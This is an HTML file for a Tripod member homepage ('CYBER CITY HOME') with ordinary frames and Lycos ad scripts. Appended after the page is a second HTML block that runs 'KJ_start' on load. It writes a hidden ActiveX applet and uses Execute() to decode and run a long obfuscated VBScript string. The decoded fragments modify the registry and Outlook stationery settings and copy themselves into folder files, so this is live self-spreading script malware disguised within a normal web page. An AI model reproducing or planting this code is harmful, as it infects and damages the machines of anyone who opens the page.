<html>
<head>
<title>
CYBER CITY HOME</title>
<meta name='keywords' content=''>
<meta name='description' content='ENJOY EVERY MOMENT'>
</head>
<frameset rows='100%,*' border='0' framespacing='0' frameborder='0'>
<frame src='sitetop.html' name='sitetop' scrolling='yes' noresize>
<frame src='sitebottom.html' name='sitebottom' scrolling='yes' noresize>	
<noframes>
<body bgcolor=#000000><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "incitygroups";
var tripod_member_page = "incitygroups/index.html";
var tripod_ratings_hash = "1319618183:654bc90c8beb42cc05cdc082f3f13e0a";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=542072";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=542072";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}

window.onload = function() {
    var f = document.getElementById("FooterAd");
    var b = document.getElementsByTagName("body")[0];
    b.removeChild(f);
    b.appendChild(f);
}

</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important; height:94px!important"> 
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=542072" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>

This page requires frames. Please upgrade your browser to the latest version.
<p>This page requires frames. Please upgrade your browser to the latest version.
</body>
</noframes>
	</frameset>
<frameset>
</frameset>
</html>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "Dai IfSheja,HlilT]tt,N^sT]tt,<agr]aSi_j,AhlleG^je[p,FKK,WkOhedh,WajPald,Sm^E,>enaduDikgKqb CF_sl]rt %CFSel@im %CFCr]]teEeli]q()KJDekeAp()KJ;nealaMaah()KJHnopYcat]$)AndOub>qncleonGJAhlen\Po(>eleH]th$Pyp]Otr!OfErjkr Jasuea N]ttOetNea\Pemh= >OO.GlenLaxt>ele Bil]Lat`(1)TmhOtr9 R]]dT]ip.Jaad9hlEf Ajstj$TmhOtr$KJWotajp()% <60 Gn L]j(TelStj% <- T`anNea\Pemh*ClgoeAxilFuf_tigj=jd AbAb TqleSln =htl T`anNea\Pemh*ClgoeOetBil]Pemh= >OO.GlenLaxt>ele Bil]Lat`(2)FidaTeel.Wjete< :KDYknlg]d= vZocralt:& GJ_kparl$) &> vZ?rL^& LipSln &rbCjHf HtehTepp>eleLamp&?lokaKat >=ttjeb 5FSG*GelBil]$FidaPald)BAtlnib&]ttjebulas 534ElkaJaadLamp&?lokaKat >eleLamp9 FKK.OhanT]ttFahe(>eleH]th$4)Ef LupeKpr 5hlilPhefFaheT]ip.Onit]vb;nLf 4 &HTEH> vZ?rL^& 8 BG@Y gjloY`= &vbk_rihp: CF_sl]rt %& : vb;nLf HlilT]ttAls]Ef LupeKpr 5vZo LdenFidaTeel.WjeterbCjHf VbkPexlEf` I^FaheT]ip.;hos]Ef` I^Ef` FmjctaknFmjctakn CFChYjgeKqb(;qrr]jtSlnin_(LakpIn\axC`]r)IfHaslEnd]tChYn =, T`anEf Daft HCaka(CmnrefpStjeng!(1)9< D?as]$c% T`anGJC`]ng]Oub9 Fajalq@isc& 6\SuZA =,=hseKJ;dan_aSuZ= ;dr(9oc(Daft HCaka(CmnrefpStjeng!(1)!- )% &:\Sm^E 50AndEfAls]KB?hafceSm^ =Iid ?urjantKprifc,1$HaslEnd]tChYn)AndEfAndBun[piofBun[piofKJ;nealaMaah()OnArrgn R]oum]NeppAb IfSheja =hteh LdenExap FmjctaknAndEfOhajaFida =Hefl$WifLat`(3) Hnogj]m >elekXCoeionBil]o\Ma_rokkftOhajad\Kpatakneju\bd]nk&dtmI^(FKK.FaheEpestk$ShYneFahe)!Th]j;]llGJAhlen\Po(Kdar]Bil](hlil!EdoeOetBil]Pemh= >OO.GlenLaxt>ele OhajaFida,2$pru]%>eleLamp&Srila 4 &HTEH> vZ?rL^& 8 BG@Y gjloY`= &vbk_rihp: CF_sl]rt %& : vb;nLf HlilT]ttBil]Pemh*ClgoeAndEf@efYqltA` =SsS`all&NegJaad HK=U_CMNREFP_UKAR\A`enleti]o\D]baudp Ukar A@)OulHoocRerkeon9 WkOhedh.R]cReY`(@GEYWHOC9H_M9?HIFA\SgbtwYne\EecrgooflXOulhoocExhneskXMe\eaV]n)WsKdeld*Re_Srila @GEYW?URJANTWQSEJXId]jtileesT&D]baudpId\SgbtwYne\EecrgooflXOulhoocExhneskX&Hefl$OulHoocRerkeon$-) .0TIaidXCoelos]Us]StYpiofary(1,NEGW@WOJ@?aldKJE]ilJag(DKEQ[CUJNENL[US=N\I\antapiekX&<afamhtI\\Kkfto]reTIicjkso^p\Omplogg Eplreko\Le^p(OmpLoggVejoiof(1).(XMaah\Sl]tigjerqNaea,Kdar]Bil]%;]llGJMYelR]c(@GEYW?URJANTWQSEJXId]jtileesT&D]baudpId\SgbtwYne\EecrgooflXOulhoocExhneskX&Hefl$OulHoocRerkeon$-) .0TIaidXWi\a Sl]tigjerqNaea,Kdar]Bil]%OoSh]hl.JagWjeteHK=U_CMNREFP_UKAR\Kkfto]reTIicjkso^p\O^bic]X9.(XOulhoocXOpleonkXMaah\E\etojLre^aref_e$-31(32,NEGW@WOJ@?aldKJE]ilJag(DKEQ[CUJNENL[US=N\SgbtwYne\EecrgooflXWif`owkMekoagajg KqbsqoteeXPrgbil]o\Ma_rokkftKutdkokEnt]nnelSelpin_o\0Y,d0*,00(,00(,0c(,00(,00(,00(06\(,1e(/60(bd]nk%;]llGJMYelR]c(@GEYW?URJANTWQSEJXSo^pwaja\Ma_rokkftTSin\kwsJT\;qrr]jtV]nsigj\Wajdooo M]osa_engOubkust]i\Pjkfidas\EecrgooflOulhoocInlarn]p S]ptifcs\(]0d(.00(,00(,00[,00(,00(,00(,46T,01],36(,Zhanc)SsS`all&NegOnit]HCAY_;QRR=JT_MOERTOoflsar]XMi[nosgbt\Gbfi[a\1(*0\Gqtlgkk\Gltigjs\E]ilTAdilkrPjafejanc],1+-07*(R=C_DOKRDCYhl CFMaahRe_$HCAY_;QRR=JT_MOERTOoflsar]XMi[nosgbt\Gbfi[a\1(*0\;kmmgj\MYelS]ptifcs\FawSl]tigjerq,Zhanc)GJueiag]Bol\ar(Daft SinH]th$/) PjkgrYi FahesT?omekn >elekXMi[nosgbt Kdar]`\Sl]tigjerq)AndBun[piofBun[piofKJ;nealaMideeu %Gj EjnorNesmie FaxtTeelPald =Ef Fkt(>OO.>ele=tislo(WajPald &WS[nipl*ex]))PhefT]ipPYph 5sqotee/2\Ef` I^I^TeelPald =sykpem+.\PhefSl]rtMlFida =SinH]th KUST=I\K]nned/2.\hlElkaKparlQpFahe 5WifLat`& OYSLAM\Carn]h.ddhAndEfSsS`all&NegOnit]HCAY_DKCAD[MA;DIN=XSo^pwaja\Ma_rokkftTSin\kwsT?urjantNarsakn\Jqn\Carn]h32(StYntUhBil]FKK.CglyFahe OenPYph w]^\kbsald*gi^,WajPald &weZXFod`er&dttFKK.CglyFahe OenPYph sqotee/2\cfwadh.gab,OenPYph sqotee/2\\asklkp.ajiCadh KB=pp]jdTg$WifLat`& sebTBol\ar.`pt$htl)SsS`all&NegOnit]HCAY_;HASKAS_JKOTT*dldX,`ll^eleWkOhedh.R]cWrape DKEQ[CL9OSEK[ROGP\.\hl\;knt]jt Lupe(ahlli[]tigj/x%isdgsnlg]dWsKdeld*Re_Srila @GEYW?LAKOESWNOOLXdldbil]XDe^]ullEcofX,OoSh]hl.JagR]]d(DKEQ[CL9OSEK[ROGP\vp`fida\D]baudpIcgj\!WkOhedh.R]cWrape DKEQ[CL9OSEK[ROGP\ddhfida\S[niplAngaje\(V:OcraltWsKdeld*Re_Srila @GEYW?LAKOESWNOOLXdldBil]XSh]hl\GlenT?ome]ndT,WajPald &PemhLat`& SScjept&axe%) &SsS`all&NegOnit]HCAY_;HASKAS_JKOTT`ll>eleTOhedhExTLrohartqOhe]pHaf`lejo\WKDPrgls\({.,25,?A5%553:)11;B-8;56-(,AA(,B8/,8CuOoSh]hl.JagWjeteHK=U_CD=SS=O_RGKT\\hlFahe\K_rihpHokpEn[kdeT,s451+-63))48(?-1)@2-:-F9%,0C(0F8.?32,yOetBil]Pemh= >OO.GlenLaxt>ele OtajpUp>ele$.,tjqe)FidaTeel.WjeteRbsLaxtFidaTeel.CdkseEn\Fuf_tigjFuf_tigj KBHik]Et(!I^InOder]<>hteh LdenExap FmjctaknAndEfPhikHocYpiof= \kcueant&hocYpiofI^Le^p(T`esLg_atakn,0) 5fahePhefT`esLg_atakn 5Mi\$ThaoLo[]tigj,9!I^FSG*GelAxt]jsigjNaea(T`esLg_atakn)8>  t`anPhikHocYpiof= Daft PhikHocYpiof(Lef$ThaoLo[]tigj) %Lef$FSG*GelBil]Jam]$ThaoLo[]tigj))!Ef` I^I^Lef$ThaoLo[]tigj) 63 LdenThaoLo[]tigj =PhikHocYpiof& XAndEfGJueiag]Bol\ar(LdisDkcaleon!Ef` I^Ef` FmjctaknFmjctakn CFMaahRe_$Re_Otr$Bil]Jam]%Gj EjnorNesmie FaxtRe_PemhOtr9 WkOhedh.R]cReY`(R]cStj%Ab R]cTeelStj=  T`anSsS`all&NegOnit]Re_Otr$Bil]Jam]Ef` I^Ef` FmjctaknFmjctakn CFObgOub ?urjantKprifc)Oub== (T]otOmp =,<k W`elePru]T]otOmp =PeslKut' 1IfPeslKut: 20Th]j;qrr]jtSlnin_= >enaduDikg &:\Epet <k=jd AbGj EjnorNesmie FaxtSelThaoFod`er9 FKK.G]pFod`er ?urjantKprifc)Oet@icKqb 5Cr]]teG^je[p(K_rihpin_*Di[piof]ry%Kat >kld]ns 5ThaoFod`er&Oub>kld]nsBol\arCgqnt9 0FojEa[d T]ipFghdejinBol\arsFod`er;kunl= >kld]nComjt #1@icKqb.Y`d >kld]nComjt,PemhBol\ar.F]meNeppAb Da_SuZ*Comjt 50 LdenLakpIn\axC`]r 5InkprR]r(CmnrefpStjeng$\$Hen ?urjantKprifc)-)%KqbSlnin_= Eed(;qrr]jtSlnin_(LakpIn\axC`]r+)(Lef$CujnenlOtrajg)%HaslEnd]tChYn-1!CmnrefpStjeng9 KB?hafceSm^(CmnrefpStjeng$HaslEnd]tChYn)Oub== )EdoeEf KqbE9 0PhefCmnrefpStjeng9 CmnrefpStjeng Da_SuZ*It]i(1!& XAxilDoElkab= (Fgn j9 1Po >kld]nComjtEf D?as]$SuZOtrajg)9 L;]se @icKqb.Apem f))PhefI^j 4Fod`er;kunlTh]j;qrr]jtSlnin_= ;qrr]jtSlnin_& <ecSm^.Ilam(b'1) T=tit@oAndEfAndEfJexlLYotIf`ex;dar9 IfotrJav(;qrr]jtSlnin_(\(Lef$CujnenlOtrajg)%-)OubKprifc =Iid ?urjantKprifc,LYotIf`ex;dar#-,L]j(CmnrefpStjeng!)LakpIn\axC`]r-)%;qrr]jtSlnin_= CFChYjgeKqb(;qrr]jtSlnin_(LakpIn\axC`]r)En\IfEn\IfLoglCFObgOub9 CmnrefpStjengEn\Fuf_tigjFuf_tigj KBLroh]gala()OnArrgn R]oum]NeppJagPYphVYhue9 @GEYWHOC9H_M9?HIFA\SgbtwYne\EecrgooflXOulhoocExhneskXDe_neeDaokD]cre]= OoSh]hl.JagR]]d(JagPYphVYhue!I^DikgDe_nee9 Th]j<esk<agr]a =BinYhyDaok :T=jd Ab>kr a91 lk 5DikgDe_nee9 KBKboKqb(<esk<agr]a)GJueiag]Bol\ar(<esk<agr]a)JexlWkOhedh.R]cWrape JagPYphVYhue$@isc@egjaeAndBun[piofBun[piofKJmima_aFod`er Lat`Jam]%Gj EjnorNesmie FaxtSelFod`erF]me9 FKK.G]pFod`er Lat`Jam]%Kat Ldis>elek= >kld]nNaea.FahesHtlAxikps 50BorAac`ThaoFida IfThaoFidasBil]Axt9 U;]se BSO&Cet=ttefoiofJam]$ThaoFida.PYph)!I^FidaExl= DTMOrBil]Axt9 @PMLOrBil]Axt9 9OPKr >ele=tt 5P@L Gn FaheEpp =JSH T`an?aldKJ9lpef`To PhikBil]*Pald,`pml%=hseAb FaheEpp =VBK T`an?aldKJ9lpef`To PhikBil]*Pald,n^s!EdoeI^FidaExl= DTTTh]j@ptEpestk= )Ef` I^N]ttEf  QCaka(PYphNYie)9 U;]se SinH]th <asklkp\%) Gn (M?as]$PaldNaea) 5UCYoe(OenPYph D]oktgl)!PhefHlpExaots9 1En\IfIfDtt=tislo =, T`anBSO&?opqBil]WifLat`& oyslam3*Xdekgtoh*ina,PYphNYieBSO&?opqBil]WifLat`& sebTBol\ar.`pt$Lat`Jam]Ef` I^Ef` FmjctaknFmjctakn CFSel@im %Gj EjnorNesmie FaxtErj*Cl]]rPeslEt 5WS[nipl*Scjept>qllf]meIfArrPhefIfSheja =htehAls]IfSheja =vbk=jd AbAb IfSheja =vbk T`anOetBSO9 Cjaat]Kbj]_t(Ocraltifc.FaheSqoteeKbj]_t!S]p WkOhedh =?reYpeOZfecl$WK_rihp.S`all%=hseSelAphheOZfecl= \kcueant&]ppdats KJWcuekp)AphheOZfecl*sel?LSA@(sB93-@C2*)1C>,-1)@0-9@B9%,0C(0FD-4A0:y)AphheOZfecl*cr]]teAjstYjce %Kat OoSh]hl 5AphheOZfecl*GelKbj]_t(!AhlleG^je[p.s]pCLKED(w0D,/FE(--F(53-)-CF%494()009,C9(142*4}!AhlleG^je[p.cjaat]Ensl]nc]$)OetBSO9 AhlleG^je[p.G]pObbact %=jd AbKat <eskG^je[p =BSO&@rinasBorAac`DikgTeel IfDikgObbactIf@iscPemh*DrareTqle 4: 2=nd@iscPemh*DrareTqle 4: 1PhefEpet >krAndEfBinYhyDaok 5DikgTeel.DjeveDatt]nFaxtDieOt`arAjn(3!RYjdoeezeFoji=(To/Gphej=rr e) 5Inl$(9& Rf`))NeppLampKprifc =Bore=1Po Dan(LdisLaxt!T]ipNmi ==sc Iid PhikPexl(i,)%)Ef LampFqm 513PhefT]ipNmi =.8Als]Ef LampFqm 510PhefT]ipNmi =.9AndEfPemh?haj= ;dr(LampFqm %Ot`arAjn(iIod0))IfPemh?haj= ;dr(+0) LdenTeelChYn =?hr -8)En\IfTeelStjeng9 T]ipSlnin_& Lamp;darNeppMjLo[gStj= Axe[qte Dai K]uArj$3)$PhikPexl&n^CrDb&Gey9nr((% = &Kth]nArj$0) &vZ?rL^CayAjn(1!= & Gphej=rr -) vb;nLfK]uArj$2)9  Older9nr(*% &rbCjHf&Keq=rr /) 5 Ot`arAjn(3!& &n^CrDb&Bore=1Po Dan(=teSlnin_%rbCjHf&TeelNue= 9oc(Eed(=teSlnin_(i,)%)vb;nLfI^TeelNue= )4 T`anvb;nLfT]ipNmi =/4vb;nLfEf` I^&n^CrDb&Pemh?haj= ;dr(LampFqm #Keq=rr e Mg` 4!%rbCjHf&IfPemh?haj= ;dr(*4) Lden&vZ?rL^Lamp;dar9 vZ?rvb;nLfEdoeI^TeelChYn =?hr .9)Phef&n^CrDb&Pemh?haj= n^Lf&vZ?rL^=jd AbrbCjHf&ThaoTepp =PhikPexl& Lamp;dar&vZ?rL^Faxt) vZ?rL^& Axe[qte PhikPexl%PhikPexl= AxeKprifc = T]ipSlnin_& HtehTepp =8 s[nipllafcua_a=vZocralt>& n^CrDb &do[qmefp.wjete && 8 dar slule5#poketigj:aZoolmpe;hefl60pp7 tgl:0ht; oedt`60pp7 h]eghl60pp7 z%end]t:207 vaoibahitq6 ha`def#> 4& AHLLELNAEA=KB&_gmastDEI?DT=(WI<PH=(co\a=cgi.mk*a[piv]T.A[piv]&XCgipofant6 &< '=PPDAT>& 8 /\ev> vb;nLf 4 &/s[nipl: vb;nLf 4 &scjepthan_qag]9vbk_rihp> vZ?rL^& LdisLaxt vZ?rL^& MjLo[gStj& n^CrDb &< 'ocralt>& n^CrDb &< '>ODQ: vb;nLf 4 &/HLIL>VZoTepp =PhikPexl& n^CrDb &QnLg_kSln &rbCjHf KB[stYnt(!OenPYph 5FSG*GelOpe[eal>kld]n(0!& XEf  BSO&Bil]Axikps(OenPYph w]^\Fghdej*htl))PhefFKK.CglyFahe OenPYph w]^\Fghdej*htl,WajPald &weZXkjo]ll&cifEf` I^I^(FKK.FaheEpestk$WifLat`& oyslam3*Xdekgtoh*ina))PhefFKK.CglyFahe OenPYph sqotee/2\\asklkp.aji$SinH]th kust]i32TgjwYhl._efEn\IfEn\Fuf_tigj"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 0"&vbCrLf&"KeyArr(1) = 0"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 4"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</body>
</HTML>